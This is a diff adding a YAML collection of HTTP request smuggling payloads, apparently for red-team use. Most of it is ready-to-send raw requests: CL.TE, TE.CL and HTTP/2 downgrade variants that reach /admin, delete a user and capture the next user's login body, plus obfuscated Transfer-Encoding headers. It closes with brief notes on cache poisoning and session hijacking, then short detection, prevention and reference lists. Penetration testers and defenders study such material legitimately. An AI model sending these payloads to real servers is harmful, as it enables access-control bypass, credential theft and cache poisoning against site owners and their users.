@@ -1,0 +1,179 @@
+# HTTP Request Smuggling Payloads
+# The #1 chain-starter in modern red team engagements
+# Used to bypass WAFs, steal credentials, poison caches, hijack sessions
+
+payload_category: "http-smuggling"
+owasp_2025: "A05"
+cwe: "CWE-444"
+severity: "CRITICAL"
+
+# ===== CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding) =====
+cl_te:
+  basic:
+    - |
+      POST / HTTP/1.1
+      Host: target.com
+      Content-Length: 13
+      Transfer-Encoding: chunked
+
+      0
+
+      SMUGGLED
+    
+    - |
+      POST / HTTP/1.1
+      Host: target.com
+      Content-Length: 6
+      Transfer-Encoding: chunked
+
+      0
+
+      G
+
+  poison_next_request:
+    - |
+      POST / HTTP/1.1
+      Host: target.com
+      Content-Length: 44
+      Transfer-Encoding: chunked
+
+      0
+
+      GET /admin HTTP/1.1
+      Host: target.com
+
+  steal_credentials:
+    - |
+      POST / HTTP/1.1
+      Host: target.com
+      Content-Length: 100
+      Transfer-Encoding: chunked
+
+      0
+
+      POST /login HTTP/1.1
+      Host: target.com
+      Content-Length: 100
+
+      username=
+
+# ===== TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length) =====
+te_cl:
+  basic:
+    - |
+      POST / HTTP/1.1
+      Host: target.com
+      Content-Length: 4
+      Transfer-Encoding: chunked
+
+      56
+      GET /admin HTTP/1.1
+      Host: target.com
+      Content-Length: 15
+
+      x=1
+      0
+
+  bypass_access_control:
+    - |
+      POST / HTTP/1.1
+      Host: target.com
+      Content-Length: 4
+      Transfer-Encoding: chunked
+
+      71
+      POST /admin/delete?user=carlos HTTP/1.1
+      Host: target.com
+      Content-Length: 15
+
+      x=1
+      0
+
+# ===== TE.TE (Both use Transfer-Encoding, obfuscation needed) =====
+te_te_obfuscation:
+  header_variants:
+    - "Transfer-Encoding: xchunked"
+    - "Transfer-Encoding : chunked"
+    - "Transfer-Encoding: chunked"
+    - "Transfer-Encoding: x"
+    - "Transfer-Encoding:[tab]chunked"
+    - "X: X[\\n]Transfer-Encoding: chunked"
+    - "Transfer-Encoding\n: chunked"
+    - "Transfer-Encoding: chunKed"
+
+# ===== H2.CL (HTTP/2 to HTTP/1.1 downgrade smuggling) =====
+h2_smuggling:
+  h2_cl:
+    - |
+      :method POST
+      :path /
+      :authority target.com
+      content-length: 0
+
+      GET /admin HTTP/1.1
+      Host: target.com
+
+  h2_te:
+    - |
+      :method POST
+      :path /
+      :authority target.com
+      transfer-encoding: chunked
+
+      0
+
+      GET /admin HTTP/1.1
+      Host: target.com
+
+  crlf_in_h2:
+    - |
+      :method GET
+      :path /
+      :authority target.com
+      foo: bar\r\nTransfer-Encoding: chunked
+
+# ===== EXPLOITATION CHAINS =====
+exploitation:
+  cache_poisoning:
+    - "Smuggle request with different Host header to poison cache"
+    - "Use smuggled request to cache attacker-controlled JS"
+
+  session_hijacking:
+    - "Smuggle POST request that captures next user's Cookie header"
+    - "Reflected XSS via smuggled request"
+
+  waf_bypass:
+    - "Smuggle malicious payload past WAF in second request"
+    - "WAF sees clean first request, backend processes smuggled second"
+
+  credential_theft:
+    - "Smuggle POST /login to capture credentials from next user's request body"
+
+# ===== DETECTION =====
+detection:
+  timing_based:
+    - "Send CL.TE probe — if response is delayed, backend uses TE"
+    - "Send TE.CL probe — if response is delayed, backend uses CL"
+
+  differential:
+    - "Send normal request vs smuggled request, compare responses"
+    - "Check if second request gets unexpected response"
+
+  tools:
+    - "smuggler.py (Python)"
+    - "Burp Suite HTTP Request Smuggler extension"
+    - "h2csmuggler (HTTP/2)"
+
+prevention:
+  - "Use HTTP/2 end-to-end (don't downgrade to HTTP/1.1)"
+  - "Configure front-end to normalize ambiguous requests"
+  - "Reject ambiguous requests with both CL and TE"
+  - "Disable Transfer-Encoding chunked if not needed"
+  - "Use the same web server software on front and backend"
+  - "Audit reverse proxy configurations"
+
+references:
+  - "PortSwigger: HTTP Request Smuggling"
+  - "CWE-444: Inconsistent Interpretation of HTTP Requests"
+  - "James Kettle - HTTP Desync Attacks"
+  - "Albinowax HTTP/2 Smuggling Research"
